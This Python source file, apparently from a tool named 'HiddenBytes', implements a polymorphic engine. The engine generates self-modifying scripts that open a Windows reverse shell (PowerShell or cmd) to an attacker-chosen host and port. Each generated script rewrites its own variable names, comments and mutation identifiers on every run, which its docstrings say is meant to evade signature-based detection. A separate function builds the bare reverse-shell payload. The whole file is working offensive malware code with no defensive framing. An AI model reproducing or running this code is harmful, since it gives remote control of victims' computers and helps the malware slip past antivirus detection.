"""
Polymorphic engine — generates self-modifying Python scripts.

The engine creates scripts that rewrite their own source code on each
execution, changing variable names, comments, and mutation signatures
while preserving core reverse shell functionality.
"""

import hashlib
import os
import random
import string


# ---------------------------------------------------------------------------
# Name / Comment pools (used both at generation time and embedded in output)
# ---------------------------------------------------------------------------

VARIABLE_POOL = [
    "socket_handler", "connection_manager", "stream_processor",
    "network_interface", "channel_bridge", "data_relay",
    "session_handle", "link_controller", "pipe_manager",
    "transport_layer", "protocol_adapter", "signal_router",
    "alpha_connector", "beta_handler", "delta_relay",
    "sigma_stream", "omega_link", "phi_channel",
    "lambda_pipe", "theta_bridge", "kappa_relay",
    "zeta_session", "eta_controller", "iota_router",
    "handler_obj", "connector_ref", "relay_instance",
    "bridge_component", "link_module", "pipe_element",
    "channel_unit", "session_core", "stream_base",
    "x0x_handler", "p1p_relay", "c2c_bridge",
    "s3s_stream", "l4l_link", "r5r_router",
    "m6m_connector", "n7n_channel", "b8b_pipe",
]

COMMENT_TEMPLATES = [
    "# Initializing connection handler...",
    "# Establishing secure channel...",
    "# Preparing data stream...",
    "# Configuring network relay...",
    "# Setting up communication bridge...",
    "# Loading session parameters...",
    "# Allocating system resources...",
    "# Initializing protocol stack...",
    "# Preparing I/O redirector...",
    "# Configuring process pipeline...",
    "# Establishing remote link...",
    "# Setting up event loop...",
]

SHELL_COMMANDS = [
    ["powershell.exe", "-NoLogo", "-NoProfile"],
    ["cmd.exe"],
]


# ---------------------------------------------------------------------------
# Payload Builder
# ---------------------------------------------------------------------------

def build_reverse_shell_payload(host: str = "192.168.1.100", port: int = 4444) -> str:
    """Build a Windows reverse shell payload as Python code.

    Args:
        host: Target IP address for the reverse shell connection
        port: Target port

    Returns:
        Python source code string of the reverse shell (PowerShell)
    """
    return (
        "import socket, subprocess, os\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.connect((" + repr(host) + ", " + str(port) + "))\n"
        "os.dup2(s.fileno(), 0)\n"
        "os.dup2(s.fileno(), 1)\n"
        "os.dup2(s.fileno(), 2)\n"
        'subprocess.call(["powershell.exe", "-NoLogo", "-NoProfile"])\n'
    )


# ---------------------------------------------------------------------------
# Polymorphic Engine
# ---------------------------------------------------------------------------

class PolymorphicEngine:
    """Generates self-modifying Python scripts.

    The generated scripts contain embedded name/comment pools and a
    _mutate_source() function that rewrites the script's own source code
    with randomised variable names, function names, comments, and
    mutation signatures on each execution.
    """

    def __init__(self, payload_code: str, output_path: str):
        self.payload_code = payload_code
        self.output_path = output_path

    # -- helpers ----------------------------------------------------------

    @staticmethod
    def _random_name() -> str:
        return random.choice(VARIABLE_POOL)

    @staticmethod
    def _random_comment() -> str:
        return random.choice(COMMENT_TEMPLATES)

    @staticmethod
    def _random_shell() -> str:
        """Return a shell command list for Windows."""
        return random.choice(SHELL_COMMANDS)

    # -- code generation --------------------------------------------------

    def generate_polymorphic_code(self, host: str = "192.168.1.100",
                                  port: int = 4444) -> str:
        """Build the complete source of a self-modifying polymorphic script."""
        mutation_sig = hashlib.md5(os.urandom(32)).hexdigest()[:16]
        func_token = self._random_name()
        var_token = self._random_name()
        comment1 = self._random_comment()
        comment2 = self._random_comment()
        comment3 = self._random_comment()
        comment4 = self._random_comment()
        comment5 = self._random_comment()
        shell_cmd = self._random_shell()

        new_mutation_id = hashlib.md5(os.urandom(16)).hexdigest()[:16]

        name_pool_repr = repr(VARIABLE_POOL)
        comment_pool_repr = repr(COMMENT_TEMPLATES)

        lines = []

        # Header
        lines.append('#!/usr/bin/env python3')
        lines.append('"""')
        lines.append('HiddenBytes - Polymorphic Binary (Signature: ' + mutation_sig + ')')
        lines.append('This binary self-modifies on each execution to evade signature-based detection.')
        lines.append('Core functionality is preserved through all mutations.')
        lines.append('"""')
        lines.append('')

        # Imports
        lines.append('import hashlib')
        lines.append('import os')
        lines.append('import random')
        lines.append('import socket')
        lines.append('import subprocess')
        lines.append('import sys')
        lines.append('')

        # Pools
        lines.append('# === Mutation Pools ===')
        lines.append('_VARIABLE_POOL = ' + name_pool_repr)
        lines.append('')
        lines.append('_COMMENT_POOL = ' + comment_pool_repr)
        lines.append('')

        # Mutation ID
        lines.append('# === Mutation Identifier ===')
        lines.append('MUTATION_ID = ' + repr(new_mutation_id))
        lines.append('')



        # Payload function
        lines.append('def ' + func_token + '():')
        lines.append('    """')
        lines.append('    ' + comment2)
        lines.append('    Execute the core payload: establish a reverse shell connection.')
        lines.append('    """')
        lines.append('    ' + comment3)
        lines.append('    ' + var_token + ' = socket.socket(socket.AF_INET, socket.SOCK_STREAM)')
        lines.append('    ' + comment4)
        lines.append('    try:')
        lines.append('        ' + var_token + '.connect((' + repr(host) + ', ' + str(port) + '))')
        lines.append('        print("[INFO] Connection established. Initializing shell...")')
        lines.append('    except Exception as e:')
        lines.append('        print("[ERROR] Connection failed: " + str(e))')
        lines.append('        print("[INFO] Retrying with alternative configuration...")')
        lines.append('        return False')
        lines.append('')
        lines.append('    # Redirect standard I/O streams')
        lines.append('    os.dup2(' + var_token + '.fileno(), 0)')
        lines.append('    os.dup2(' + var_token + '.fileno(), 1)')
        lines.append('    os.dup2(' + var_token + '.fileno(), 2)')
        lines.append('')
        lines.append('    ' + comment5)
        lines.append('    subprocess.call(' + repr(shell_cmd) + ')')
        lines.append('    return True')
        lines.append('')

        # Self-mutation function
        lines.append('def _mutate_source():')
        lines.append('    """')
        lines.append('    Self-modification routine.')
        lines.append('    Rewrites this script with mutated variable names,')
        lines.append('    and altered comments to change the binary signature.')
        lines.append('    """')
        lines.append('    script_path = __file__')
        lines.append('')
        lines.append('    with open(script_path, "r", encoding="utf-8") as f:')
        lines.append('        source = f.read()')
        lines.append('')
        lines.append('    # Generate new mutation ID')
        lines.append('    new_id = hashlib.md5(os.urandom(16)).hexdigest()[:16]')
        lines.append('    source = source.replace(MUTATION_ID, new_id)')
        lines.append('')
        lines.append('    # Generate new random names for variables')
        lines.append('    renames = {')
        lines.append('        ' + repr(func_token) + ': random.choice(_VARIABLE_POOL),')
        lines.append('        ' + repr(var_token) + ': random.choice(_VARIABLE_POOL),')
        lines.append('    }')
        lines.append('')
        lines.append('    for old_name, new_name in renames.items():')
        lines.append('        source = source.replace(old_name, new_name)')
        lines.append('')
        lines.append('    # Replace comments with new random ones')
        lines.append('    new_comments = [random.choice(_COMMENT_POOL) for _ in range(5)]')
        lines.append('    comment_idx = 0')
        lines.append('    for i, line in enumerate(source.split("\\n")):')
        lines.append('        stripped = line.strip()')
        lines.append('        if stripped.startswith("#") and "PADDING" not in stripped and "Signature:" not in stripped:')
        lines.append('            if comment_idx < len(new_comments):')
        lines.append('                indent = line[:len(line) - len(line.lstrip())]')
        lines.append('                lines_list = source.split("\\n")')
        lines.append('                lines_list[i] = indent + new_comments[comment_idx]')
        lines.append('                source = "\\n".join(lines_list)')
        lines.append('                comment_idx += 1')
        lines.append('')
        lines.append('    with open(script_path, "w", encoding="utf-8") as f:')
        lines.append('        f.write(source)')
        lines.append('')
        lines.append('    print("[INFO] Polymorphic signature updated successfully.")')
        lines.append('')

        # Main
        lines.append('')
        lines.append('def main():')
        lines.append('    """Main entry point - mutate and execute."""')
        lines.append('    print("╔══════════════════════════════════════════════╗")')
        lines.append('    print("║     HiddenBytes Polymorphic Binary v1.0      ║")')
        lines.append('    print("╚══════════════════════════════════════════════╝")')
        lines.append('    print()')
        lines.append('    print("[INFO] Mutating binary signature...")')
        lines.append('    try:')
        lines.append('        _mutate_source()')
        lines.append('    except Exception as e:')
        lines.append('        print("[WARN] Mutation skipped: " + str(e))')
        lines.append('')
        lines.append('    print()')
        lines.append('    print("[INFO] Reverse shell initialized. Attempting connection to attacker...")')
        lines.append('    print("[INFO] Target: ' + host + ':' + str(port) + '")')
        lines.append('    print()')
        lines.append('    sys.stdout.flush()')
        lines.append('')
        lines.append('    success = ' + func_token + '()')
        lines.append('    if not success:')
        lines.append('        print("[ERROR] Failed to establish connection.")')
        lines.append('        sys.exit(1)')
        lines.append('')
        lines.append('if __name__ == "__main__":')
        lines.append('    main()')
        lines.append('')

        # Random padding comments
        for _ in range(random.randint(3, 8)):
            lines.append("# NOP_" + str(random.randint(100000, 999999)) + ": "
                         + ''.join(random.choices(string.ascii_lowercase, k=20)))

        return '\n'.join(lines) + '\n'

    def generate(self, host: str = "192.168.1.100", port: int = 4444):
        """Generate and write the polymorphic binary to disk."""
        code = self.generate_polymorphic_code(host, port)
        with open(self.output_path, 'w') as f:
            f.write(code)
        return code
